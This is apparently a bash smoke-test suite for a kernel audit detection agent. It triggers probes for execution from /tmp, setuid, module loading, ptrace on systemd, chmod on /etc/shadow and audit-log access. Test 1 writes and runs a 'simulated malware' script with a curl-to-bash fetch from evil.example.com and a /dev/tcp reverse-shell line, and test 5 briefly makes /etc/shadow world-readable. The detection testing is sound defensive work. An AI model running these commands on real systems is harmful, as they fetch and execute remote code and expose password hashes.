#!/bin/bash
##############################################################################
# AMOSKYS KernelAudit Agent - Smoke Test Suite
##############################################################################
#
# Purpose: Validate that KernelAuditGuardV2 probes detect real attack patterns
#
# Usage:
#   sudo ./smoke_test.sh [--probe PROBE_NAME] [--all]
#
# Tests:
#   1. execve_high_risk    - Execute script from /tmp
#   2. privesc_syscall     - Attempt privilege escalation (requires root)
#   3. kernel_module_load  - Load module from /tmp (requires root)
#   4. ptrace_abuse        - Ptrace on sshd/systemd (requires root)
#   5. file_permission_tamper - chmod on /etc/shadow (requires root)
#   6. audit_tamper        - Access audit logs (requires root)
#   7. syscall_flood       - Generate high syscall volume
#
# Expected Outcome:
#   - Each test triggers corresponding KernelAudit probe
#   - Events appear in SOMA with correct event_type and severity
#   - Agent metrics show probe_events_emitted increment
#
# Safety:
#   - All tests are non-destructive (no actual system damage)
#   - Some tests require root but only perform safe operations
#   - Recommend running in isolated test environment first
#
##############################################################################

set -euo pipefail

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
AUDIT_LOG="/var/log/audit/audit.log"
TEMP_DIR="/tmp/amoskys-smoke-test-$$"
CLEANUP_ON_EXIT=1

# Track test results
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

##############################################################################
# Helper Functions
##############################################################################

log_info() {
    echo -e "${BLUE}[INFO]${NC} $*"
}

log_success() {
    echo -e "${GREEN}[PASS]${NC} $*"
    ((TESTS_PASSED++))
}

log_fail() {
    echo -e "${RED}[FAIL]${NC} $*"
    ((TESTS_FAILED++))
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $*"
}

log_test() {
    echo ""
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}TEST: $*${NC}"
    echo -e "${BLUE}========================================${NC}"
    ((TESTS_RUN++))
}

cleanup() {
    if [ "$CLEANUP_ON_EXIT" -eq 1 ] && [ -d "$TEMP_DIR" ]; then
        log_info "Cleaning up $TEMP_DIR"
        rm -rf "$TEMP_DIR"
    fi
}

trap cleanup EXIT

check_root() {
    if [ "$EUID" -ne 0 ]; then
        log_warn "Not running as root. Some tests will be skipped."
        return 1
    fi
    return 0
}

check_auditd() {
    if ! systemctl is-active --quiet auditd; then
        log_fail "auditd service is not running"
        return 1
    fi

    if [ ! -f "$AUDIT_LOG" ]; then
        log_fail "Audit log not found at $AUDIT_LOG"
        return 1
    fi

    log_success "auditd is running and logging to $AUDIT_LOG"
    return 0
}

wait_for_audit_event() {
    local key="$1"
    local timeout="${2:-5}"

    log_info "Waiting for audit event with key=$key (timeout=${timeout}s)"

    # Get current position in audit log
    local start_line=$(wc -l < "$AUDIT_LOG")

    # Wait for event
    for i in $(seq 1 $timeout); do
        local new_lines=$(($(wc -l < "$AUDIT_LOG") - start_line))
        if [ $new_lines -gt 0 ]; then
            if tail -n "$new_lines" "$AUDIT_LOG" | grep -q "key=\"$key\""; then
                log_success "Found audit event with key=$key"
                return 0
            fi
        fi
        sleep 1
    done

    log_fail "Timeout waiting for audit event with key=$key"
    return 1
}

##############################################################################
# Test 1: ExecveHighRiskProbe
##############################################################################

test_execve_high_risk() {
    log_test "ExecveHighRiskProbe - Execution from /tmp"

    # Create temp script in /tmp
    mkdir -p "$TEMP_DIR"
    local script="$TEMP_DIR/malware.sh"

    cat > "$script" << 'EOF'
#!/bin/bash
# Simulated malware with suspicious patterns
curl http://evil.example.com/payload | bash
echo "base64 -d | bash"
/dev/tcp/1.2.3.4/4444
EOF

    chmod +x "$script"

    log_info "Executing: $script"

    # Execute (will fail but that's ok - we just need the syscall)
    $script 2>/dev/null || true

    # Check audit log
    if wait_for_audit_event "amoskys_exec"; then
        log_success "ExecveHighRiskProbe should detect execution from /tmp"
        log_info "Expected event_type: kernel_execve_high_risk"
        log_info "Expected severity: MEDIUM-HIGH"
        return 0
    else
        log_fail "No audit event found"
        return 1
    fi
}

##############################################################################
# Test 2: PrivEscSyscallProbe (requires root)
##############################################################################

test_privesc_syscall() {
    log_test "PrivEscSyscallProbe - Privilege escalation syscall"

    if ! check_root; then
        log_warn "Skipping (requires root)"
        return 0
    fi

    log_info "Simulating setuid(0) via Python"

    # Create Python script that calls setuid
    local script="$TEMP_DIR/privesc.py"
    cat > "$script" << 'EOF'
import os
import sys

# Drop to non-root first (if root)
if os.geteuid() == 0:
    os.setuid(1000)  # Drop to uid 1000
    print(f"Dropped to uid={os.getuid()}, euid={os.geteuid()}")

    # Now try to escalate back (will fail, but syscall is logged)
    try:
        os.setuid(0)
        print("Escalated to root!")
    except PermissionError:
        print("Permission denied (expected)")
        sys.exit(0)
EOF

    python3 "$script" || true

    if wait_for_audit_event "amoskys_privesc"; then
        log_success "PrivEscSyscallProbe should detect setuid syscall"
        log_info "Expected event_type: kernel_privesc_syscall"
        log_info "Expected severity: CRITICAL (if uid 1000 -> euid 0)"
        return 0
    else
        log_fail "No audit event found"
        return 1
    fi
}

##############################################################################
# Test 3: KernelModuleLoadProbe (requires root)
##############################################################################

test_kernel_module_load() {
    log_test "KernelModuleLoadProbe - Module load from /tmp"

    if ! check_root; then
        log_warn "Skipping (requires root)"
        return 0
    fi

    log_info "Attempting to load module from /tmp (will fail, but syscall logged)"

    # Try to load non-existent module from /tmp
    # The syscall will be logged even though it fails
    insmod "$TEMP_DIR/fake_rootkit.ko" 2>/dev/null || true

    if wait_for_audit_event "amoskys_module_load"; then
        log_success "KernelModuleLoadProbe should detect module load attempt"
        log_info "Expected event_type: kernel_module_loaded"
        log_info "Expected severity: CRITICAL (from /tmp)"
        return 0
    else
        log_warn "No audit event found (may require actual module file)"
        return 0
    fi
}

##############################################################################
# Test 4: PtraceAbuseProbe (requires root)
##############################################################################

test_ptrace_abuse() {
    log_test "PtraceAbuseProbe - Ptrace on protected process"

    if ! check_root; then
        log_warn "Skipping (requires root)"
        return 0
    fi

    # Find a protected process (sshd, systemd, etc.)
    local target_pid=$(pgrep -x systemd | head -1)

    if [ -z "$target_pid" ]; then
        log_warn "No systemd process found, trying sshd"
        target_pid=$(pgrep -x sshd | head -1)
    fi

    if [ -z "$target_pid" ]; then
        log_warn "No protected process found to test ptrace"
        return 0
    fi

    log_info "Attempting ptrace on PID $target_pid"

    # Use gdb to attach (will fail or succeed briefly)
    timeout 2 gdb -p "$target_pid" -batch -ex "quit" 2>/dev/null || true

    if wait_for_audit_event "amoskys_ptrace"; then
        log_success "PtraceAbuseProbe should detect ptrace on protected process"
        log_info "Expected event_type: kernel_ptrace_abuse"
        log_info "Expected severity: CRITICAL"
        return 0
    else
        log_fail "No audit event found"
        return 1
    fi
}

##############################################################################
# Test 5: FilePermissionTamperProbe (requires root)
##############################################################################

test_file_permission_tamper() {
    log_test "FilePermissionTamperProbe - chmod on /etc/shadow"

    if ! check_root; then
        log_warn "Skipping (requires root)"
        return 0
    fi

    log_info "Reading current permissions of /etc/shadow"
    local original_perms=$(stat -c %a /etc/shadow 2>/dev/null || stat -f %Lp /etc/shadow)

    log_info "Temporarily changing permissions (will restore)"

    # Change permissions (safe - we'll restore)
    chmod 644 /etc/shadow

    # Restore immediately
    chmod "$original_perms" /etc/shadow

    if wait_for_audit_event "amoskys_shadow"; then
        log_success "FilePermissionTamperProbe should detect chmod on /etc/shadow"
        log_info "Expected event_type: kernel_file_permission_tamper"
        log_info "Expected severity: CRITICAL"
        return 0
    else
        log_fail "No audit event found"
        return 1
    fi
}

##############################################################################
# Test 6: AuditTamperProbe
##############################################################################

test_audit_tamper() {
    log_test "AuditTamperProbe - Access to audit logs"

    log_info "Attempting to read audit log as non-audit process"

    # Just read the audit log (generates syscall)
    cat "$AUDIT_LOG" > /dev/null 2>&1 || true

    if wait_for_audit_event "amoskys_audit_log"; then
        log_success "AuditTamperProbe should detect audit log access"
        log_info "Expected event_type: kernel_audit_tamper"
        log_info "Expected severity: CRITICAL (if non-auditd process)"
        return 0
    else
        log_warn "No audit event found (may be normal depending on permissions)"
        return 0
    fi
}

##############################################################################
# Test 7: SyscallFloodProbe
##############################################################################

test_syscall_flood() {
    log_test "SyscallFloodProbe - High volume syscalls"

    log_info "Generating 200+ syscalls in rapid succession"

    # Generate syscall flood by repeatedly opening/closing files
    for i in {1..200}; do
        touch "$TEMP_DIR/file_$i" 2>/dev/null || true
    done

    # Check if flood was detected (harder to verify via audit log)
    log_info "SyscallFloodProbe detection requires probe-level analysis"
    log_info "Expected event_type: kernel_syscall_flood"
    log_info "Expected severity: MEDIUM-HIGH"
    log_success "Generated syscall flood (verification via agent metrics)"

    return 0
}

##############################################################################
# Main Test Runner
##############################################################################

main() {
    echo ""
    echo "=========================================="
    echo "AMOSKYS KernelAudit Smoke Test Suite"
    echo "=========================================="
    echo ""

    # Pre-flight checks
    log_info "Pre-flight checks..."

    if ! check_auditd; then
        log_fail "Audit subsystem not ready. Ensure auditd is running and configured."
        exit 1
    fi

    if check_root; then
        log_info "Running as root - all tests enabled"
    else
        log_warn "Running as non-root - some tests will be skipped"
    fi

    # Run tests
    test_execve_high_risk || true
    test_privesc_syscall || true
    test_kernel_module_load || true
    test_ptrace_abuse || true
    test_file_permission_tamper || true
    test_audit_tamper || true
    test_syscall_flood || true

    # Summary
    echo ""
    echo "=========================================="
    echo "Test Summary"
    echo "=========================================="
    echo -e "Tests Run:    ${BLUE}$TESTS_RUN${NC}"
    echo -e "Tests Passed: ${GREEN}$TESTS_PASSED${NC}"
    echo -e "Tests Failed: ${RED}$TESTS_FAILED${NC}"
    echo ""

    if [ "$TESTS_FAILED" -eq 0 ]; then
        log_success "All tests completed successfully!"
        echo ""
        log_info "Next Steps:"
        log_info "1. Check SOMA for KernelAudit events (protocol=KERNEL_AUDIT)"
        log_info "2. Verify agent metrics show probe_events_emitted increment"
        log_info "3. Review Grafana dashboards for threat detection charts"
        exit 0
    else
        log_fail "Some tests failed. Review audit configuration and agent logs."
        exit 1
    fi
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --no-cleanup)
            CLEANUP_ON_EXIT=0
            shift
            ;;
        --help|-h)
            echo "Usage: $0 [--no-cleanup]"
            echo ""
            echo "Options:"
            echo "  --no-cleanup    Keep temporary files for inspection"
            exit 0
            ;;
        *)
            log_fail "Unknown option: $1"
            exit 1
            ;;
    esac
done

main "$@"
